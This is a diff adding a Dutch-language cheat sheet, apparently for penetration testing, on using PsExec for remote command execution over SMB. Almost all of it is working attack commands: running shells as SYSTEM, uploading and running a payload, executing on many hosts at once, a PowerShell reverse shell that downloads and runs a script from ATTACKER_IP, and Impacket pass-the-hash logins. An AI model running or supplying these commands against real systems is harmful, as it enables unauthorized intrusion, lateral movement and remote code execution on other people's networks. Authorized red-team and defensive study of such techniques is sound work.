@@ -1,0 +1,43 @@
+# PsExec — Remote command execution via SMB (Sysinternals)
+# Voert commando's uit op remote systemen via SMB named pipes (ADMIN$/IPC$)
+#
+# === Syntax ===
+# PsExec64.exe \\TARGET -u DOMAIN\USER -p PASS cmd.exe
+#
+# === Belangrijkste opties ===
+# -u USER        Gebruikersnaam (DOMAIN\USER of .\USER voor lokaal)
+# -p PASS        Wachtwoord
+# -s             Draai als SYSTEM
+# -i             Interactieve sessie (zichtbaar op remote desktop)
+# -d             Niet wachten op resultaat (detach)
+# -c             Kopieer lokaal programma naar remote systeem
+# -h             Draai elevated (UAC bypass als admin)
+# -accepteula    Accepteer EULA automatisch (eerste keer vereist)
+# -n TIMEOUT     Timeout in seconden voor verbinding
+#
+# === Voorbeelden ===
+
+# Commando uitvoeren met credentials
+PsExec64.exe \\TARGET -u DOMAIN\USER -p PASS -accepteula cmd.exe /c whoami
+
+# SYSTEM shell als je al local admin bent
+PsExec64.exe \\TARGET -s -accepteula cmd.exe
+
+# Payload uploaden en uitvoeren
+PsExec64.exe \\TARGET -u DOMAIN\USER -p PASS -c payload.exe -accepteula
+
+# Commando op meerdere machines tegelijk
+PsExec64.exe \\TARGET1,TARGET2,TARGET3 -u DOMAIN\USER -p PASS -s cmd.exe /c hostname
+
+# Commando op alle machines in een bestand
+PsExec64.exe @targets.txt -u DOMAIN\USER -p PASS -s cmd.exe /c ipconfig
+
+# PowerShell reverse shell via PsExec
+PsExec64.exe \\TARGET -u DOMAIN\USER -p PASS -s -d powershell.exe -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
+
+# Interactieve sessie (zichtbaar voor ingelogde gebruiker)
+PsExec64.exe \\TARGET -u DOMAIN\USER -p PASS -i cmd.exe
+
+# Pass-the-hash variant via Impacket
+impacket-psexec DOMAIN/USER:PASS@TARGET
+impacket-psexec -hashes :NTHASH DOMAIN/USER@TARGET
